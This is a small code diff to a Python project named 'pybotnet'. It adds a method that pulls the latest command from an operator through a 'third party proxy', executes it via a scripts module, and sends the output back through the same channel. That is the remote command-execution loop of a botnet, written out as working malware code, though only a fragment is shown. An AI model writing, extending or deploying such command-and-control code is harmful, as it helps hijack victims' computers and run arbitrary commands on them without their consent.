@@ -3,6 +3,7 @@ import logging
 
 # import pybotnet modules
 import util
+import scripts
 
 
 class PyBotNet:
@@ -65,3 +66,13 @@ class PyBotNet:
                 return last_message
 
         return False
+
+    def get_and_execute_scripts_by_third_party_proxy(self):
+
+        self.command = self.get_last_command_by_third_party_proxy()
+
+        if self.command:
+            self.output = scripts.execute_scripts(self.command, self.logger)
+
+            if self.output:
+                self.send_message_by_third_party_proxy(self.output)
